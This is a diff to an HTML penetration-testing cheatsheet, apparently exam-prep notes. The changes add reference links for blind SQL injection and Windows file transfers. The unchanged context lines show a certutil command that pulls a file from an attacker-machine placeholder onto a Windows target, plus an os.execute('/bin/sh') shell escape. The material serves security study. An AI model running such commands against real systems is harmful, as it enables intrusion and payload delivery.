@@ -168,7 +168,7 @@ http://www.anonhack.in/2018/07/boolean-based-blind-sql-injection-how-to-do-manua
 <p><font size="3.5" color="black">* https://github.com/Gandosha/OSCP/blob/master/Documents/SQL%20Injection%20Cheatsheet.md</font></p>
 <br>
 <p><font size="3.5" color="black">Examples:</font></p>
-<p><font size="3.5" color="black">* Boolean Blind SQL Injection - https://www.youtube.com/watch?v=4LM_EIehbsU</font></p>
+<p><font size="3.5" color="black">* Boolean Blind SQL Injection - https://0xdf.gitlab.io/2019/01/12/htb-oz.html / https://www.youtube.com/watch?v=4LM_EIehbsU</font></p>
 <p><font size="3.5" color="black">* Time Based SQL Injection - https://www.youtube.com/watch?v=mphLv1ZCMf8 </font></p>
 <p><font size="3.5" color="black">* Error Based + upload shell https://www.youtube.com/watch?v=vPgMi7R9tvs  /  https://www.youtube.com/watch?v=0xrDZi8Qq0A</font></p>
 <p><font size="3.5" color="black">* From MSSQL to RCE - https://www.tarlogic.com/en/blog/red-team-tales-0x01/</font></p>
@@ -686,6 +686,7 @@ os.execute('/bin/sh')
 <p><h3>File Transfer</h3></p>
 <pre style="background-color:black;color:white;">
 certutil -urlcache -split -f http://[ATTACKERS_MACHINE]/[FILE_TO_TRANSFER] C:\\users\public\[FILE_TO_TRANSFER]	#certutil method (Linux --> Windows)
+SMB - https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html
 python3 -m http.server [PORT]	#Simple HTTP request handler - very basic web server serving files relative to the current directory - In Arch
 python -m SimpleHTTPServer [PORT]	#In Kali
 php -S 127.0.0.1:8080	#HTTP request handler in php
